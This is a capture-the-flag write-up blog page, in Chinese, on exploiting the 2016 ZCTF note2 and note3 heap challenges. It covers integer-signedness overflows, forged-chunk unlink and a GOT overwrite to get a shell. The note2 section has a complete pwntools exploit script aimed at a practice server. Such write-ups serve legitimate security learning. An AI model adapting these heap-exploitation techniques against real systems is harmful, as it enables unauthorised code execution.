@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="codeva-ROfYcqLkCh" />
+    <meta name="msvalidate.01" content="ECA3E06A0E52A2AC90C4B06F12981FB2" />
+    <meta name="description" content="2016-ZCTF-note2https:&#x2F;&#x2F;files.buuoj.cn&#x2F;files&#x2F;761fb16a644de97e745bb29b281c0fff&#x2F;note2 grxer@Ubuntu16:~&#x2F;Desktop&#x2F;pwn&#x2F;heap$ checksec note2[*] &amp;#x27;&#x2F;home&#x2F;grxer&#x2F;Desktop&#x2F;pwn&#x2F;heap&#x2F;note2&amp;#x27;    Arch:     amd6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink 2016-ZCTF-note2-and-note3">
+<meta property="og:url" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/index.html">
+<meta property="og:site_name" content="Grxer&#39;s Blog">
+<meta property="og:description" content="2016-ZCTF-note2https:&#x2F;&#x2F;files.buuoj.cn&#x2F;files&#x2F;761fb16a644de97e745bb29b281c0fff&#x2F;note2 grxer@Ubuntu16:~&#x2F;Desktop&#x2F;pwn&#x2F;heap$ checksec note2[*] &amp;#x27;&#x2F;home&#x2F;grxer&#x2F;Desktop&#x2F;pwn&#x2F;heap&#x2F;note2&amp;#x27;    Arch:     amd6">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315170826792.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315171243972.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315164908151.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233602653.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233803481.png">
+<meta property="og:image" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/image-20230316002002255.png">
+<meta property="article:published_time" content="2023-03-15T08:46:51.000Z">
+<meta property="article:modified_time" content="2023-03-29T16:33:35.356Z">
+<meta property="article:author" content="bxz">
+<meta property="article:tag" content="Unlink">
+<meta property="article:tag" content="Integer Overflow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315170826792.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Unlink 2016-ZCTF-note2-and-note3</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 lrt">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/03/16/2017-insomn-hack-wheelofrobots/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/03/14/Unlink-2014-HITCON-stkof/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&text=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&is_video=false&description=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Unlink 2016-ZCTF-note2-and-note3&body=Check out this article: https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&title=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&name=Unlink 2016-ZCTF-note2-and-note3&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/15/2016-ZCTF-note2-and-note3/&t=Unlink 2016-ZCTF-note2-and-note3"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-ZCTF-note2"><span class="toc-number">1.</span> <span class="toc-text">2016-ZCTF-note2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0unlink-chunk"><span class="toc-number">2.</span> <span class="toc-text">伪造unlink chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leak-%E6%8B%BFshell"><span class="toc-number">3.</span> <span class="toc-text">leak 拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2016-ZCTF-note3"><span class="toc-number">4.</span> <span class="toc-text">2016-ZCTF-note3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D%E6%BA%A2%E5%87%BA%E6%96%B9%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">第一种溢出方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%BA%A2%E5%87%BA%E6%96%B9%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">第二种溢出方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8D"><span class="toc-number">4.3.</span> <span class="toc-text">第三种</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%A5%BD%E8%AF%B4"><span class="toc-number">4.4.</span> <span class="toc-text">其他好说</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">4.5.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Unlink 2016-ZCTF-note2-and-note3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">bxz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-15T08:46:51.000Z" itemprop="datePublished">2023-03-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Integer-Overflow/" rel="tag">Integer Overflow</a>, <a class="tag-link-link" href="/tags/Unlink/" rel="tag">Unlink</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016-ZCTF-note2"></a>2016-ZCTF-note2</h2><p><a target="_blank" rel="noopener" href="https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2">https://files.buuoj.cn/files/761fb16a644de97e745bb29b281c0fff/note2</a></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec note2</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/note2&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>没开pie而且有指针全局数组再bss段，最多四个堆块，可通过数组里的指针编辑修改数据，优先考虑unlink</p>
+<p>找找哪里有堆溢出不</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">ReadStr</span><span class="params">(<span class="type">char</span> *s, __int64 len, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    s[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  s[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自定义了一个输入函数，可惜忽略了signed数和unsigned数比较时signed会转变为unsigned数，我们malloc(0)时，len-1为-1,-1和unsigned i比较时会变为0xffffffff，可以堆溢出</p>
+<p>malloc(0)时，glibc 的要求 chunk 块至少可以存储 4 个必要的字段 (prev_size,size,fd,bk)，所以会分配 0x20 的空间。</p>
+<h2 id="伪造unlink-chunk"><a href="#伪造unlink-chunk" class="headerlink" title="伪造unlink chunk"></a>伪造unlink chunk</h2><p>content &#x3D; b’a’ * 8 + p64(0xa1) + p64(fakefd) + p64(fakebk) + b’b’ * 0x48<br>newnote(0x80, content)<br>newnote(0, ‘a’ * 8)<br>newnote(0x80, ‘b’ * 16)</p>
+<p>在chunk0里伪造chunk，为了绕过&#x3D;P的检测我们</p>
+<p>ptr &#x3D; 0x0000000000602120 这里存储的是伪造chunk的开始地址<br>fakefd &#x3D; ptr - 0x18<br>fakebk &#x3D; ptr - 0x10</p>
+<p>这里我们不能直接在chunk1申请时进行溢出，因为那时候我们还没有申请到chunk2，溢出会到topchunk，</p>
+<p>我们先删除在申请就可以，因为大小是fastbin，再申请还是那个堆</p>
+<p>deletenote(1)<br>content &#x3D; b’a’ * 16 + p64(0xa0) + p64(0x90)<br>newnote(0,content)</p>
+<p>这样我们就可以溢出chunk2</p>
+<p>deletenote(2) unlink</p>
+<p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315170826792.png" alt="image-20230315170826792"></p>
+<p>和我们上一篇文章讨论的一样把ptr地址内容改为ptr-0x18</p>
+<h2 id="leak-拿shell"><a href="#leak-拿shell" class="headerlink" title="leak 拿shell"></a>leak 拿shell</h2><p>修改chunk0把ptr[0]修改为atoi_got,直接show就可以泄露出来atoi地址</p>
+<p>atoi_got &#x3D; elf.got[‘atoi’]<br>content &#x3D; b’a’ * 0x18 + p64(atoi_got)<br>editnote(0, 1, content)<br>shownote(0)</p>
+<p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315171243972.png" alt="image-20230315171243972"></p>
+<p>再利用edit改写其got为system，输入binsh拿shell即可</p>
+<p>content &#x3D; p64(system)<br>editnote(0, 1, content)<br>ru(b’option—&gt;&gt;’)<br>sl(b’&#x2F;bin&#x2F;sh\x00’)</p>
+<p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315164908151.png" alt="image-20230315164908151"></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./note2&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;29970&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line">    io.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400C65&#x27;)#new</span></span><br><span class="line"><span class="comment"># db(&#x27;b* 0x400CE4&#x27;)#delete</span></span><br><span class="line">db(<span class="string">&#x27;b *0x400F74&#x27;</span>)<span class="comment">#edit</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;address:&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;grxer&#x27;</span>)</span><br><span class="line">ptr = <span class="number">0x0000000000602120</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fakefd) + p64(fakebk) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">newnote(<span class="number">0x80</span>, content)</span><br><span class="line">newnote(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">newnote(<span class="number">0x80</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">content = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_ad)</span><br><span class="line">base=atoi_ad-libc.dump(<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+base</span><br><span class="line">content = p64(system)</span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line">ru(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="2016-ZCTF-note3"><a href="#2016-ZCTF-note3" class="headerlink" title="2016-ZCTF-note3"></a>2016-ZCTF-note3</h2><p><a target="_blank" rel="noopener" href="https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3">https://files.buuoj.cn/files/569bb2532339a0bd669f5d2457526ba7/zctf_2016_note3</a></p>
+<p>和note2一样的保护</p>
+<p>和note2相比，这次可以申请最多7个chunk，全局指针数组0x6020C0的0是最近申请或修改过的指针，后面依次顺序是malloc的chunk</p>
+<p>这次没有了show函数帮我方便的leak地址</p>
+<p>老的堆溢出的漏洞依旧存在</p>
+<p>还有了新的堆溢出方式</p>
+<h3 id="第一种溢出方式"><a href="#第一种溢出方式" class="headerlink" title="第一种溢出方式"></a>第一种溢出方式</h3><p>和之前一下自定义read时-1转换为无符号读取即可</p>
+<h3 id="第二种溢出方式"><a href="#第二种溢出方式" class="headerlink" title="第二种溢出方式"></a>第二种溢出方式</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  v0 = getsize();</span><br><span class="line">  v3 = v0 % <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 % <span class="number">7</span> &gt;= v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (__int64)*(&amp;ptr + v3);</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input the new content:&quot;</span>);</span><br><span class="line">      myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + <span class="number">8</span>], <span class="number">10</span>);</span><br><span class="line">      ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + v3);</span><br><span class="line">      LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Edit success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;please input correct id.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">getsize</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  myread((__int64)nptr, <span class="number">32LL</span>, <span class="number">10</span>);</span><br><span class="line">  v1 = atol(nptr);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> -v1;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>NEG指令 -x&#x3D;~x+1</strong></p>
+<p>当x为该位数可以表示的最大负数时，比如int 最大负数0x80000000 </p>
+<img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233602653.png" alt="image-20230315233602653" style="zoom:67%;">
+
+<p>取反+1还是0x80000000 </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v2 = <span class="number">-2147483648</span>;</span><br><span class="line">    <span class="keyword">if</span> (v2==-v2) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ohhhhh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/15/2016-ZCTF-note2-and-note3/image-20230315233803481.png" alt="image-20230315233803481"></p>
+</blockquote>
+<p>这里我们输入最大负整数-9223372036854775808，getsize返回-v1还是这个值给到edit里的v0，v3&#x3D;-1，同时满足 v0 % 7 &gt;&#x3D; v0</p>
+<p><code>myread((__int64)*(&amp;ptr + v3), ptr_st[v3 + 8], 10);</code></p>
+<p>这样我们修改ptr[-1]也就是最近使用的堆，大小为ptr_st[-1 + 8]，第6个chunk的大小，我们把第6个chunk地址申请的比最近使用的那个大就可以实现堆溢出</p>
+<h3 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h3><p>new时检测了chunk个数是不是大于7，但是只是puts，并没有实质性的阻值申请，申请后会把chunk8的ptr放到ptr数组开头的同时会把ptr放到，chunk1的size指针地址里，改变了chunk1的size，可以实现溢出</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note is full, add fail&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the length of the note content:(less than 1024)&quot;</span>)</span><br><span class="line">      </span><br><span class="line">  *(&amp;ptr + i) = v3;</span><br><span class="line">  ptr_st[i + <span class="number">8</span>] = size;</span><br><span class="line">  ptr_st[<span class="number">0</span>] = (__int64)*(&amp;ptr + i);</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他好说"><a href="#其他好说" class="headerlink" title="其他好说"></a>其他好说</h3><p>常规构造unlink后，没有show方便泄露地址，我们可以自己利用puts自己泄露</p>
